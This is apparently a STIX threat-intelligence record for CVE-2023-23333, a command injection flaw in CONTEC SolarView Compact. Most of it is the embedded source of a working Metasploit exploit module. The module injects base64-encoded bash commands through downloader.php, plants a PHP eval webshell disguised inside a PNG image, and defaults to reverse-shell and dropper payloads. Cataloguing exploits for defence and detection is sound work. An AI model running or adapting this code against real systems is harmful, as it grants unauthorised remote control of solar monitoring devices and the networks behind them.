{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--52487f9c-c81b-404b-8201-67321235fec8",
    "created": "2024-08-14T17:04:03.359978Z",
    "modified": "2024-08-14T17:04:03.359982Z",
    "name": "SolarView Compact unauthenticated remote command execution vulnerability.",
    "description": " CONTEC's SolarView\u2122 Series enables you to monitor and visualize solar power and is only available in Japan. This module exploits a command injection vulnerability on the SolarView Compact `v6.00` web application via vulnerable endpoint `downloader.php`. After exploitation, an attacker will have full access with the same user privileges under which the webserver is running (typically as user `contec`).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/solarview_unauth_rce_cve_2023_23333.rb",
            "external_id": "solarview_unauth_rce_cve_2023_23333.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-23333"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/kE3lzTZGV2/cve-2023-23333"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Format::PhpPayloadPng\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SolarView Compact unauthenticated remote command execution vulnerability.',\n        'Description' => %q{\n          CONTEC's SolarView\u2122 Series enables you to monitor and visualize solar power and is only available in Japan.\n          This module exploits a command injection vulnerability on the SolarView Compact `v6.00` web application\n          via vulnerable endpoint `downloader.php`.\n          After exploitation, an attacker will have full access with the same user privileges under\n          which the webserver is running (typically as user `contec`).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF module contributor\n        ],\n        'References' => [\n          ['CVE', '2023-23333'],\n          ['URL', 'https://attackerkb.com/topics/kE3lzTZGV2/cve-2023-23333']\n        ],\n        'DisclosureDate' => '2023-05-15',\n        'Platform' => ['php', 'unix', 'linux'],\n        'Arch' => [ARCH_PHP, ARCH_CMD, ARCH_ARMLE, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'PHP',\n            {\n              'Platform' => 'php',\n              'Arch' => ARCH_PHP,\n              'Type' => :php,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => ['wget', 'printf', 'echo', 'bourne'],\n              'Linemax' => 65535,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false,\n          'HttpClientTimeout' => 40 # set to 40 seconds because http response is pretty slow.\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [ true, 'The SolarView endpoint URL', '/' ]),\n      OptString.new('WEBSHELL', [\n        false, 'The name of the webshell with extension. Webshell name will be randomly generated if left unset.', nil\n      ], conditions: %w[TARGET == 0])\n    ])\n  end\n\n  def upload_webshell\n    # randomize file name if option WEBSHELL is not set\n    @webshell_name = if datastore['WEBSHELL'].blank?\n                       \"#{Rex::Text.rand_text_alpha(8..16)}.php\"\n                     else\n                       datastore['WEBSHELL'].to_s\n                     end\n\n    @post_param = Rex::Text.rand_text_alphanumeric(1..8)\n\n    # inject PHP payload into the PLTE chunk of a PNG image to hide the payload\n    php_payload = \"<?php @eval(base64_decode($_POST[\\'#{@post_param}\\']));?>\"\n    png_webshell = inject_php_payload_png(php_payload, injection_method: 'PLTE')\n    return nil if png_webshell.nil?\n\n    # encode webshell data and write to file on the target at the tmp directory for execution\n    # the tmp directory is writeable and a symbolic link to /tmp in a standard solarview installation\n    payload = Base64.strict_encode64(png_webshell.to_s)\n    cmd = \"echo #{payload}|base64 -d >tmp/#{@webshell_name}\"\n    return execute_command(cmd)\n  end\n\n  def execute_php(cmd, _opts = {})\n    payload = Base64.strict_encode64(cmd)\n    return send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'tmp', @webshell_name),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_post' => {\n        @post_param => payload\n      }\n    })\n  end\n\n  def execute_command(cmd, _opts = {})\n    # Encode payload with base64 to ensure proper execution\n    payload = Base64.strict_encode64(cmd)\n    cmd = \"echo #{payload}|base64 -d|bash\"\n    return send_request_cgi({\n      'method' => 'GET',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'uri' => normalize_uri(target_uri.path, 'downloader.php'),\n      'vars_get' => {\n        'file' => \";#{cmd};.zip\"\n      }\n    })\n  end\n\n  def check\n    # Checking if the target is vulnerable by echoing a randomised marker that will return the marker in the response.\n    # next we will try to read the version file stored in /opt/svc/version\n    print_status(\"Checking if #{peer} can be exploited.\")\n    marker = Rex::Text.rand_text_alphanumeric(8..16)\n    res = execute_command(\"echo #{marker};cat /opt/svc/version\")\n    if res && res.code == 200 && res.body.include?(marker)\n      CheckCode::Vulnerable(res.body.match(/SolarView Compact ver\\.\\d\\.\\d\\d/).to_s)\n    else\n      CheckCode::Safe('No valid response received from the target.')\n    end\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :php\n      res = upload_webshell\n      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200\n      register_file_for_cleanup(@webshell_name.to_s)\n      execute_php(payload.encoded)\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_cmdstager({ linemax: target.opts['Linemax'] })\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-15",
    "x_mitre_platforms": [
        "linux'"
    ]
}